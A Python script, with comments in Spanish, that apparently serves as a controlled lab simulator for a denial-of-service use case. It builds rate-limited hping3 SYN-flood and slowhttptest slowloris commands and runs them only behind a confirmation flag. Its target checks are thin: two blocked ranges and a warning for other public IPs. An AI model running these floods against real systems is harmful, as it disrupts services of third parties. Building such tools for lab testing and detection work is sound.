#!/usr/bin/env python3
"""
uc06_ddos_controlled.py — Simulador controlado UC-06 (DDoS).

Owner: P3 — Angeles Castillo

⚠️ ADVERTENCIA DE LABORATORIO ⚠️
Este script construye los COMANDOS de hping3/slowhttptest con tasa
limitada, pero NO LOS EJECUTA AUTOMÁTICAMENTE contra ningún host real.
Solo imprime el comando exacto que deberías correr manualmente, una vez
que P4 confirme el <VICTIM_LAB_IP> del laboratorio aislado.

Esto es intencional:
  - Nunca debe ejecutarse contra una IP pública o un sistema que no sea
    el laboratorio aislado.
  - El operador (tú) debe confirmar visualmente el target antes de que
    cualquier paquete salga.

Qué hace este script:
  - Valida que el target sea una IP/host que luzca como de laboratorio
    (rechaza IPs públicas conocidas/triviales como salvaguarda básica;
    esto NO es una garantía de seguridad completa — la responsabilidad
    de apuntar correctamente sigue siendo del operador).
  - Construye el comando hping3 o slowhttptest con rate limitado.
  - Imprime el comando final con un recordatorio de seguridad, y un
    bloque opcional --execute que SOLO corre si el usuario pasa
    explícitamente --i-confirm-this-is-my-lab.

Uso:
    python uc06_ddos_controlled.py --target <VICTIM_LAB_IP> --mode hping3 --rate-pps 50
    python uc06_ddos_controlled.py --target <VICTIM_LAB_IP> --mode slowhttptest --connections 50
"""
from __future__ import annotations

import argparse
import ipaddress
import shlex
import subprocess
import sys

# Salvaguarda básica: rechazar rangos de IP claramente públicos/conocidos.
# Esto NO sustituye el juicio del operador — solo evita errores obvios de
# copy-paste contra una IP real.
_BLOCKED_RANGES = [
    "8.8.8.0/24",       # Google DNS
    "1.1.1.0/24",       # Cloudflare DNS
]


def _looks_like_placeholder(target: str) -> bool:
    return target.strip().upper() in {"<VICTIM_LAB_IP>", "VICTIM_LAB_IP"}


def _validate_target(target: str) -> None:
    if _looks_like_placeholder(target):
        raise SystemExit(
            "[!] Debes reemplazar <VICTIM_LAB_IP> por la IP real del host de "
            "laboratorio (pendiente de confirmar con P4) antes de continuar."
        )
    try:
        ip = ipaddress.ip_address(target)
    except ValueError:
        # Puede ser un hostname del lab (p. ej. 'victim-web-01') — se acepta,
        # pero no se puede validar el rango.
        print(f"[*] '{target}' no es una IP literal; se asume hostname interno del lab.")
        return

    for blocked_range in _BLOCKED_RANGES:
        if ip in ipaddress.ip_network(blocked_range):
            raise SystemExit(
                f"[!] '{target}' cae en un rango bloqueado conocido ({blocked_range}). "
                "Este script nunca debe usarse contra infraestructura pública. Abortando."
            )
    if ip.is_global:
        print(
            f"[!] ADVERTENCIA: '{target}' parece ser una IP pública/global. "
            "Este simulador está diseñado SOLO para laboratorios aislados. "
            "Verifica que esta sea realmente la IP de tu lab antes de continuar."
        )


def build_hping3_command(target: str, rate_pps: int, duration_s: int) -> list[str]:
    # -S: SYN flood. --faster/-i u<n>: controla la tasa (microsegundos entre paquetes).
    # Se calcula el intervalo en microsegundos a partir de rate_pps para mantener
    # la tasa explícitamente limitada y predecible (requisito del manual P3).
    interval_us = max(1, int(1_000_000 / rate_pps))
    return [
        "sudo", "hping3", "-S", "-p", "80",
        "-i", f"u{interval_us}",
        "-c", str(rate_pps * duration_s),
        target,
    ]


def build_slowhttptest_command(target: str, connections: int, duration_s: int) -> list[str]:
    return [
        "slowhttptest",
        "-c", str(connections),
        "-H",                       # modo slowloris (headers)
        "-i", "10",                  # intervalo entre datos parciales (s)
        "-r", "20",                  # tasa de nuevas conexiones por segundo
        "-t", "GET",
        "-u", f"http://{target}/",
        "-l", str(duration_s),
        "-x", "24",
    ]


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Simulador controlado UC-06 (DoS de red) — rate-limited, solo lab."
    )
    parser.add_argument("--target", required=True, help="Host del laboratorio (placeholder <VICTIM_LAB_IP>)")
    parser.add_argument("--mode", choices=["hping3", "slowhttptest"], required=True)
    parser.add_argument("--rate-pps", type=int, default=50, help="Paquetes/seg para hping3 (límite recomendado: <=100 en lab)")
    parser.add_argument("--connections", type=int, default=50, help="Conexiones simultáneas para slowhttptest")
    parser.add_argument("--duration-s", type=int, default=15, help="Duración del escenario en segundos")
    parser.add_argument(
        "--i-confirm-this-is-my-lab",
        action="store_true",
        help="Flag explícito requerido para EJECUTAR el comando (en vez de solo imprimirlo). "
        "Sin este flag, el script solo muestra el comando.",
    )
    args = parser.parse_args()

    _validate_target(args.target)

    if args.rate_pps > 200:
        raise SystemExit(
            "[!] rate-pps > 200 excede el límite seguro recomendado para laboratorio. "
            "Reduce la tasa o ajusta el límite con criterio dentro de tu entorno aislado."
        )

    if args.mode == "hping3":
        cmd = build_hping3_command(args.target, args.rate_pps, args.duration_s)
    else:
        cmd = build_slowhttptest_command(args.target, args.connections, args.duration_s)

    print("=" * 70)
    print("⚠️  COMANDO DE LABORATORIO — SOLO CONTRA HOST AISLADO DEL LAB  ⚠️")
    print("=" * 70)
    print(shlex.join(cmd))
    print("=" * 70)

    if not args.i_confirm_this_is_my_lab:
        print(
            "[*] Modo 'solo mostrar' (default). Para ejecutar de verdad, vuelve a "
            "correr con --i-confirm-this-is-my-lab una vez que confirmes que "
            f"'{args.target}' es tu host de laboratorio (no una IP pública)."
        )
        return 0

    print("[*] Ejecutando contra el host de laboratorio confirmado...")
    try:
        subprocess.run(cmd, check=True, timeout=args.duration_s + 30)
    except FileNotFoundError:
        print(
            f"[!] La herramienta '{cmd[0] if cmd[0] != 'sudo' else cmd[1]}' no está instalada "
            "en este entorno. Instálala en el host de laboratorio antes de ejecutar."
        )
        return 1
    except subprocess.TimeoutExpired:
        print("[*] Comando detenido por timeout de seguridad.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
